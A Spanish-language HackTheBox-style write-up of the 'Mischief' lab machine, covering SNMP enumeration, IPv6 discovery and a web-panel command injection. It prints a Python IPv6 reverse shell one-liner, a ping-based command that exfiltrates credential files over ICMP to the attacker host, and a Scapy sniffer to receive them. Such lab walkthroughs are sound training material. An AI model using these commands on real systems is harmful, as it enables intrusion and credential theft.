---
layout: post
title: Mischief
date: 2023-03-27
description:
img:
fig-caption:
tags: [eWPT, OSCP (Intrusión), eWPTXc2, eCPPTv2, eCPTX]
---
___

<center><img src="/writeups/assets/img/Mischief-htb/Mischief.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por SNMP

* Information Leakage

* Enumeración por IPv6

* Exfiltración de datos por ICMP

* Reutilización de credenciales (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.92 -sS 10.10.16.2 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 15:38 GMT
Nmap scan report for 10.10.10.92
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
3366/tcp open  creativepartnr

Nmap done: 2 IP addresses (2 hosts up) scanned in 38.49 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,3366 10.10.10.92 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 15:41 GMT
Nmap scan report for 10.10.10.92
Host is up (0.078s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a90a6b1e633850715b2eea7b9467752 (RSA)
|   256 d0d7007c3bb0a632b229178d69a6843f (ECDSA)
|_  256 3f1c77935cc06cea26f4bb6c59e97cb0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.77 seconds
```

## Puerto 3306 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.92:3366/
http://10.10.10.92:3366/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]
```

Necesito de credenciales para acceder

Enumero los puerto por UDP

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.92 -sU 10.10.16.2 -oG openportsudp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 15:55 GMT
Nmap scan report for 10.10.10.92
Host is up (0.36s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Nmap scan report for 10.10.16.2
Host is up (0.000037s latency).
Not shown: 65534 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 2 IP addresses (2 hosts up) scanned in 39.08 seconds
```

Está abierto el SNMP. Extraigo una community string válida

```null
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.10.92
Scanning 1 hosts, 120 communities
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
```

Enumero información y la almaceno a un archivo

```null
snmpbulkwalk -v2c -c public 10.10.10.92 > snmpbulkscan
```

Se leakea un usuario y un script

```null
HOST-RESOURCES-MIB::hrSWRunParameters.689 = STRING: "/home/loki/hosted/webstart.sh"
```

Extraigo la dirección IPv6

```null
cat snmpbulkscan | grep IP-MIB | grep -oP '".*?"' | tr -d '"' | grep "de" | tail -n 1
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:b3:f4
```

Tengo conectividad

```null
ping6 -c1 dead:beef::0250:56ff:feb9:b3f4
PING dead:beef::0250:56ff:feb9:b3f4(dead:beef::250:56ff:feb9:b3f4) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:b3f4: icmp_seq=1 ttl=63 time=42.8 ms

--- dead:beef::0250:56ff:feb9:b3f4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.783/42.783/42.783/0.000 ms
```

Hago un escaneo de puertos por IPv6

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -6 dead:beef::0250:56ff:feb9:b3f4 -oG openportsipv6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:47 GMT
Nmap scan report for dead:beef::250:56ff:feb9:b3f4
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```

El puerto 80 está abierto

```null
nmap -sCV -p22,80 -6 dead:beef::0250:56ff:feb9:b3f4 -oN portscanipv6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:49 GMT
Nmap scan report for dead:beef::250:56ff:feb9:b3f4
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a90a6b1e633850715b2eea7b9467752 (RSA)
|   256 d0d7007c3bb0a632b229178d69a6843f (ECDSA)
|_  256 3f1c77935cc06cea26f4bb6c59e97cb0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 005056b9b3f4
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

La página principal se vé así

<img src="/writeups/assets/img/Mischief-htb/1.png" alt="">

Añado la IP al ```/etc/hosts```

```null
echo 'dead:beef::250:56ff:feb9:b3f4 mischief' >> /etc/hosts
```

Desde el SNMP se puede ver que este servicio se está montando con python

```null
cat snmpbulkscan | grep "704"
HOST-RESOURCES-MIB::hrSWRunIndex.704 = INTEGER: 704
HOST-RESOURCES-MIB::hrSWRunName.704 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.704 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.704 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.704 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
HOST-RESOURCES-MIB::hrSWRunType.704 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.704 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.704 = INTEGER: 30
HOST-RESOURCES-MIB::hrSWRunPerfMem.704 = INTEGER: 13724 KBytes
```

Aparecen credenciales en texto claro. Se reutilizan para el puerto 3306. Dentro hay otras

<img src="/writeups/assets/img/Mischief-htb/2.png" alt="">

Para el otro panel, son válidas ```Administrator:trickeryanddeceit```

<img src="/writeups/assets/img/Mischief-htb/3.png" alt="">

Existe una forma de exfiltrar datos por ICMP

```null
#!/usr/bin/python3

from scapy.all import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
interface = 'tun0'

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')
    

if __name__ == '__main__': # xxd -p -c 4 /etc/hosts | while read i; do echo $i | xxd -ps -r; done

    sniff(iface=interface, prn=data_parser)
```

Extraigo el archivo con las credenciales

```null
command=xxd -p -c 4 /home/loki/cred* | while read i; do ping -c 1 -p $i 10.10.16.2; done
```

```null
python3 icmp_exfiltrate.py
pass: lokiisthebestnorsegod
```

Me conecto por SSH a la máquina víctima

```null
ssh loki@mischief
The authenticity of host 'mischief (dead:beef::250:56ff:feb9:b3f4)' can't be established.
ED25519 key fingerprint is SHA256:LRoc9mZWtnzRyWauACsRMtbfxC4kfWgpskmzscQNeGo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mischief' (ED25519) to the list of known hosts.
loki@mischief's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 28 07:47:33 UTC 2023

  System load:  0.0               Processes:            160
  Usage of /:   61.7% of 6.83GB   Users logged in:      0
  Memory usage: 40%               IP address for ens33: 10.10.10.92
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
loki@Mischief:~$ cat user.txt 
bf58078e7b802c5f32b545eea7c90060
```

# Escalada

Gano acceso también como ```www-data``` a través de una reverse shell por IPv6

```null
command=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:4::1000",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from dead:beef::250:56ff:feb9:43f7.
Ncat: Connection from dead:beef::250:56ff:feb9:43f7:38116.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
$ export TERM=xterm
$ export SHELL=bash
$ stty rows 55 columns 209
$ bash
www-data@Mischief:/$ 
```

En el histórico de la bash se leakea una contraseña

```null
loki@Mischief:~$ cat .bash_history 
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit
```

No puedo ejecutar el comando su

```null
loki@Mischief:~$ getfacl /bin/su 
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Sin embargo, como ```www-data``` sí

```null
www-data@Mischief:/home$ su root
Password: 
root@Mischief:/home# 
```

Veo la segunda flag

```null
root@Mischief:/# find \-name root.txt 2>/dev/null | xargs cat
ae155fad479c56f912c65d7be4487807
The flag is not here, get a shell to find it!
```